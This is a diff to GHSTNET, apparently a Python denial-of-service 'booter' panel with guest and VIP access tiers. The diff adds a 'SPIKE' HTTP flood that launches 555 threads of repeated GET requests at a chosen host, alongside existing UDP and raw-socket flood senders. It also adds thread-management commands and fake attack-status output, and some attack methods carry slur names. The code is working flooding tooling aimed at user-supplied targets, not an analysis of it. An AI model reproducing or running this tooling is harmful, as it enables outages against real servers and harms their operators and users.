@@ -11,6 +11,7 @@ import os
 import colorama
 from colorama import *
 
+
 sys.stdout.write("\x1b]2;GHSTNET || Loaded: 19\x07")
 def modifications():
     print ("Contact Misfortune or Reaper the script is currently under maitnance")
@@ -31,6 +32,7 @@ method = """\033[91m
 ║ \033[00mSLPR <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
 ║ \033[00mBNET <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m USE INFO CMD\033[91m ║
 ║ \033[00mNULL <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m CNUKE ATTACK\033[91m ║
+║ \033[00mSPIKE <HOST> <PORT> <TIMEOUT>        \033[91m  | \033[00m CHTTP ATTACK\033[91m ║
 ║═══════════════════════FREE═METHOD══════════════════════║              
 ║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m  |\033[00m SYN  ATTACK\033[91m   ║
 ╚════════════════════════════════════════════════════════╝\033[00m
@@ -39,7 +41,7 @@ method = """\033[91m
 info = """
 [ ghstinfo ] welcome to the new net with little power bit still enough to hit a home and web
 [ ghstinfo ] bnet info: it kills botnets quite well
-[ ghstinfo ] all cslap, cnuke, bnet methods are custom"""
+[ ghstinfo ] all cslap, cnuke, bnet, spike methods are custom"""
  
 version = "3.2"
  
@@ -64,6 +66,7 @@ tools = """\033[91m
 ║ \033[00mAttacks                       \033[91m|\033[00m RUNNING ATTACKS\033[91m      ║
 ║ \033[00mPing <HOST>                   \033[91m|\033[00m PING A HOST\033[91m          ║
 ║ \033[00mResolve <HOST>                \033[91m|\033[00m GRAB A DOMIANS IP\033[91m    ║
+║ \033[00mkill-threads                  \033[91m|\033[00m KILLS DEAD THREADS\033[91m   ║
 ║ \033[00mPortscan <HOST> <RANGE>       \033[91m|\033[00m PORTSCAN A HOST  \033[91m    ║
 ║ \033[00mDnsresolve <HOST>             \033[91m|\033[00m GRAB ALL SUB-DOMAINS\033[91m ║
 ║ \033[00mStats                         \033[91m|\033[00m DISPLAY GHSTNET STATS\033[91m║
@@ -74,16 +77,7 @@ updatenotes = """\033[91m
 ╔══════════════════════════════════════════════════════╗
 ║                     \033[00mUPDATE NOTES\033[91m                     ║
 ║══════════════════════════════════════════════════════║
-║ \033[00m- Better ascii menu\033[91m                                  ║
-║ \033[00m- Updated command casing no longer only capital\033[91m      ║
-║ \033[00m- Updated attack methods\033[91m                             ║
-║ \033[00m- Timeout bug fixed\033[91m                                  ║
-║ \033[00m- Background attacks\033[91m                                 ║
-║ \033[00m- Running task displayer\033[91m                             ║
-║ \033[00m- All tools fixed and working\033[91m                        ║
-║ \033[00m- Fixed HTTP & SYN Methods All Methods Working\033[91m       ║ 
-║ \033[00m- Deleted HTTP & Added STD, STD Is Working & Tested\033[91m  ║
-╚══════════════════════════════════════════════════════╝\033[00m
+                            ||NONE||
  
 """
 statz = """
@@ -143,13 +137,20 @@ udp = True
 syn = True
 icmp = True
 std = True
+totalThr = []
 class Master:
  
     def __init__(self, grade):
         self.grade = "null"
  
 
- 
+def sp(str):
+    st = 0.05
+    for letter in str:
+        sys.stdout.write(letter)
+        sys.stdout.flush()
+        time.sleep(st)
+    print() 
 def synsender(host, port, timer, payload):
     global uaid
     global udp
@@ -162,11 +163,11 @@ def synsender(host, port, timer, payload):
     
     said += 1
     aid += 1
-    tattacks += 1
     while time.time() < timeout and udp and attack:
         sock.sendto(payload, (host, int(port)))
     said -= 1
     aid -= 1
+    ##tattacks -= 1
 
 def custom2(host, port, timer, payload):
     global uaid
@@ -180,11 +181,13 @@ def custom2(host, port, timer, payload):
     
     said += 1
     aid += 1
-    tattacks += 1
+    #tattacks += 1
+    
     while time.time() < timeout and udp and attack:
         sock.sendto(payload, (host, int(port)))
     said -= 1
     aid -= 1
+    #tattacks -= 1
 def custom3(host, port, timer, payload):
     global uaid
     global udp
@@ -197,11 +200,13 @@ def custom3(host, port, timer, payload):
     
     said += 1
     aid += 1
-    tattacks += 1
+    #tattacks += 1
+
     while time.time() < timeout and udp and attack:
         sock.sendto(payload, (host, int(port)))
     said -= 1
     aid -= 1
+    #tattacks -= 1
 
 def custom4(host, port, timer, payload):
     global uaid
@@ -212,20 +217,22 @@ def custom4(host, port, timer, payload):
  
     timeout = time.time() + float(timer)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
+    #tattacks += 1
     said += 1
     aid += 1
-    tattacks += 1
+
     while time.time() < timeout and udp and attack:
         sock.sendto(payload, (host, int(port)))
     said -= 1
     aid -= 1
+    #tattacks -= 1
 
 def custom(host, port, timer, payload):
     global uaid
     global udp
     global aid
     global tattacks
+    global totalThr
     global said
  
     timeout = time.time() + float(timer)
@@ -233,11 +240,13 @@ def custom(host, port, timer, payload):
     
     said += 1
     aid += 1
-    tattacks += 1
+    #tattacks += 1
+
     while time.time() < timeout and udp and attack:
         sock.sendto(payload, (host, int(port)))
     said -= 1
     aid -= 1
+    #tattacks -= 1
     
 def udpsender(host, port, timer, punch):
     global uaid
@@ -250,10 +259,12 @@ def udpsender(host, port, timer, punch):
     
     uaid += 1
     aid += 1
-    tattacks += 1
+    #tattacks += 1
+
     while time.time() < timeout and udp and attack:
         sock.sendto(punch, (host, int(port)))
     uaid -= 1
+    #tattacks -= 1
     aid -= 1
  
 def icmpsender(host, port, timer, punch):
@@ -266,12 +277,14 @@ def icmpsender(host, port, timer, punch):
     sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
  
     iaid += 1
+    #tattacks += 1
     aid += 1
-    tattacks += 1    
+        
     while time.time() < timeout and icmp and attack:
         sock.sendto(punch, (host, int(port)))
     iaid -= 1
     aid -= 1
+    #tattacks -= 1
  
 def stdsender(host, port, timer, punch):
     global iaid
@@ -283,31 +296,53 @@ def stdsender(host, port, timer, punch):
     sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
  
     iaid += 1
+    #tattacks += 1
     aid += 1
-    tattacks += 1
+
     while time.time() < timeout and icmp and attack:
         sock.sendto(punch, (host, int(port)))
     iaid -= 1
+    tattacks -=1
     aid -= 1
  
-def httpsender(host, timer):
+def httpsender(host, port, timer):
     global haid
     global icmp
     global aid
     global tattacks
  
     timeout = time.time() + float(timer)
-    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
 
-    haid += 1
-    aid += 1
-    tattacks += 1
+    #haid += 1
+    #aid += 1
+    #tattacks += 1
+
+    sock.connect((host, int(port)))
+    
     while time.time() < timeout and icmp and attack:
-         requests.get(host)
+        try:
+            sock.send( f'GET / HTTP/1.1\r\nHost: {host}\r\n\r\n'.encode() )
+        except TimeoutError:
+            sock.close()
+            print("Stoped Spike Early Server Downed.")
+            break
+        except ConnectionRefusedError:
+            print("Wrong Port If Its A Https Ip Use port 443 else use port 80 or host offline.")
+            break
+        except socket.error:
+            continue
+        
+            
+    
          #sock.sendto(payload, (host, int(port)))
         #sock.sendto(punch, (host, int(port)))
+    sock.close()
+    totalThr.clear()
     haid -= 1
     aid -= 1
+    ##tattacks -= 1
  
  
 def main():
@@ -326,8 +361,10 @@ def main():
     global syn
     global icmp
     global std
+    global totalThr
  
     while True:
+        
         grade = "0"
         if username == "root":
             grade = "ADMIN"
@@ -457,11 +494,14 @@ def main():
                 main()
             else:
                 try:
+                    
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
-                    print ("UDP: Attack sent to: {}".format (host))
+                    #print ("UDP: Attack sent to: {}".format (host))
+                    sp("Sending Udp Attack...")
                     punch = random._urandom(int(pack))
                     threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
+                    print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks}\nMethod Type: VIP""")
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
@@ -477,8 +517,10 @@ def main():
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
                     payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
-                    print ("RAPE: Attack sent to: {}".format (host))
+                    #print ("RAPE: Attack sent to: {}".format (host))
+                    sp("Sending Rape Attack...")
                     punch = random._urandom(int(pack))
+                    print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks + 1}\nMethod Type: VIP""")
                     threading.Thread(target=custom, args=(host, port, timer, punch)).start()
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
@@ -495,9 +537,11 @@ def main():
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
                     payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
-                    print ("COON: Attack sent to: {}".format (host))
+                    #print ("COON: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
+                    sp("Sending Coon Attack...")
                     threading.Thread(target=custom, args=(host, port, timer, punch)).start()
+                    print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks + 1}\nMethod Type: VIP""")
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
@@ -512,10 +556,12 @@ def main():
                 try:
                     sinput, host, port, timer = sin.split(" ")
                     socket.gethostbyname(host)
-                    print ("NULL: Attack sent to: {}".format (host))
+                    #print ("NULL: Attack sent to: {}".format (host))
                     payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
                     #punch = random._urandom(int(pack))
+                    sp("Sending Null Attack...")
                     threading.Thread(target=custom4, args=(host, port, timer, payload)).start()
+                    print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks + 1}\nMethod Type: VIP""")
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
@@ -531,9 +577,11 @@ def main():
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
                     payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
-                    print ("TCP: Attack sent to: {}".format (host))
+                    #print ("TCP: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
+                    sp("Sending Tcp Attack...")
                     threading.Thread(target=custom3, args=(host, port, timer, punch)).start()
+                    print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks + 1}\nMethod Type: VIP""")
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
@@ -549,9 +597,11 @@ def main():
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
                     payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
-                    print ("SLPR: Attack sent to: {}".format (host))
+                    #print ("SLPR: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
+                    sp("Sending Slpr Attack...")
                     threading.Thread(target=custom2, args=(host, port, timer, punch)).start()
+                    print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks + 1}\nMethod Type: VIP""")
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
@@ -567,9 +617,10 @@ def main():
                     sinput, host, port, timer = sin.split(" ")
                     socket.gethostbyname(host)
                     payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
-                    print ("BNET: Attack sent to: {}".format (host))
-                    
+                    #print ("BNET: Attack sent to: {}".format (host))
+                    sp("Sending Bnet Attack...")
                     threading.Thread(target=custom4, args=(host, port, timer, payload)).start()
+                    print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks + 1}\nMethod Type: VIP""")
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
@@ -584,26 +635,34 @@ def main():
                 try:
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
-                    print ("STD: Attack sent to: {}".format (host))
+                    #print ("STD: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
+                    sp("Sending Std Attack...")
                     threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
+                    print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks + 1}\nMethod Type: VIP""")
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
                 except socket.gaierror:
                     print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                     main()
-        elif sinput == "http":
+        elif sinput == "spike":
             if username == "guest":
                 print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                 main()
             else:
                 try:
-                    sinput, host, port, timer, pack = sin.split(" ")
+                    sinput, host, port, timer = sin.split(" ")
                     socket.gethostbyname(host)
-                    print ("Attack sent to: {}".format (host))
-                    punch = random._urandom(int(pack))
-                    threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
+                    payload = "GET / HTTP/1.0\r\n\r\n"
+                    #print ("Attack sent to: {}".format (host))
+                    sp("Sending Spike & Kill Http Attack...")
+                    
+                    for i in range(555):
+                        thr = threading.Thread(target=httpsender, args=(host, port, timer))
+                        thr.start()
+                        totalThr.append(thr)
+                    print(f"""Attack Sent!\nThreads: 5\nBots Used:0\nServers Used: 1\nCon Used: {tattacks + 1}\nMethod Type: VIP""")
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
@@ -618,9 +677,11 @@ def main():
                 try:
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
-                    print ("ICMP: Attack sent to: {}".format (host))
+                    #print ("ICMP: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
+                    sp("Sending Icmp Attack...")
                     threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
+                    print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks + 1}\nMethod Type: VIP""")
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
@@ -631,9 +692,11 @@ def main():
             try:
                 sinput, host, port, timer, pack = sin.split(" ")
                 socket.gethostbyname(host)
-                print ("SYN: Attack sent to: {}".format (host))
+                #print ("SYN: Attack sent to: {}".format (host))
                 punch = random._urandom(int(pack))
+                sp("Sending Syn Attack...")
                 threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
+                print(f"""Attack Sent!\nThreads: 1\nBots Used:0\nServers Used: 1\nCon Used:{tattacks + 1}\nMethod Type: FREE""")
             except ValueError:
                 print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                 main()
@@ -642,9 +705,18 @@ def main():
                 main()
         elif sinput == "stopattacks":
             attack = False
+            for thr in totalThr:
+                thr.join()
+            totalThr.clear()
             while not attack:
                 if aid == 0:
                     attack = True
+        elif sinput == "kill-threads":
+            print("Killing Threads...")
+            for thr in totalThr:
+                thr.join()
+            print("Done...")
+            main()
         elif sinput == "stop":
             what = sin.split(" ")[1]
             if what == "udp":
@@ -662,9 +734,11 @@ def main():
                     print ("[\033[91mGHST\033[00m] No ICMP processes running")
                     udp = True
                     main()
+            
         else:
             print ("[\033[91mGHST\033[00m] {} Not a command".format(sinput))
             main()
+                    
  
  
  
